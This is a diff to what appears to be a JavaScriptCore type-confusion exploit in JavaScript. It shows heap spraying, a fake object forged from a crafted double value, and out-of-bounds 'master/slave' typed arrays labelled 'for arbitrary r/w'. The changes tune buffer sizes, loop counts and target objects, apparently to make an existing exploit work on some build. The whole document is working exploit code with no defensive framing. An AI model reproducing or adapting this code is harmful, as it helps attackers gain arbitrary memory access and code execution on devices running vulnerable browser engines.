@@ -3,7 +3,7 @@ var leaker_obj = {a: 0};
 var leaker_arr = new Uint32Array(6);
 
 //for arbitrary r/w
-var oob_slave = new Uint8Array(2048);
+var oob_slave = new Uint8Array(1024);
 var oob_master = new Uint32Array(7);
 
 var spray = [];
@@ -20,9 +20,10 @@ for(var i = 0; i < 0x10000; i++)
     spray_one();
 
 //5678 is the length, see the original exploit for explanation of a
-var target = {a: 2.1100820415101592e-303, b: false, c: true, d: 5678};
+var target = {a: 2.1100820415101592e-303, b: false, c: true, d: 5678, e: 5678};
+//var target = {a: 2.1100820415101592e-303, b: false, c: true, d: 5678};
 //crash if this second target is not present. not used anywhere, try removing if it crashes
-var target2 = {a: 2.1100820415101592e-303, b: false, c: true, e: 5678};
+//var target2 = {a: 2.1100820415101592e-303, b: false, c: true, e: 5678};
 
 var impl_idx = 0;
 
@@ -77,7 +78,7 @@ function trigger(x)
 
 try
 {
-    for(var _ = 0; _ < 2048; _++)
+    for(var _ = 0; _ < 1024; _++)
     {
         var impl = create_impl(); //JSString::toIdentifier checks some bits in the type-confused structure ID, so iterate over those
         var s = {a: impl};
